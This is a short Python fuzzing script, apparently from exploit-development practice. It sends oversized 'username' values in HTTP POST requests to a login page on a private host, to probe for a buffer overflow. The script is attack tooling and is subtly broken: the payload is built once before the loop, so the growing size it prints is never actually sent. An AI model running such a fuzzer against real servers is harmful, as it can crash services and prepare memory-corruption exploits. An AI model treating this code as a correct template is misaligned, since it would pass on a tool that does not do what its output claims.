#!/usr/bin/python
import socket
import time
import sys

size = 800
host = "192.168.127.10"
buffer = "A"*size
uri  = "login"

headers = """POST /{uri} HTTP/1.1\r
Host: {host}\r
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: {length}\r
Origin: http://{host}\r
Connection: close\r
\r
"""

body = "username=" + buffer + "&password=A"

body_bytes = body.encode('ascii')
header_bytes = headers.format(
  uri=uri,
  host=str(host),
  length=len(body_bytes) 
).encode('iso-8859-1')
payload = header_bytes + body_bytes
print(payload)


while(size < 2000):
  try:
    print("Sending Buffer" + " " + str(size))
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, 80))
    s.send(payload)
    '''while True:
      data = s.recv(4096)
      if not data:
        break
      response += data
    s.close()
    headers, body = response.split(b"\r\n\r\n", 1)
    header_lines = headers.decode('iso-8859-1').split("\r\n")
    for line in header_lines:
      print(line)
    
    # Print the response body
    print(body)'''
    size += 100
    time.sleep(10)
    
  except:
    print("\nCould not connect!")
    sys.exit()
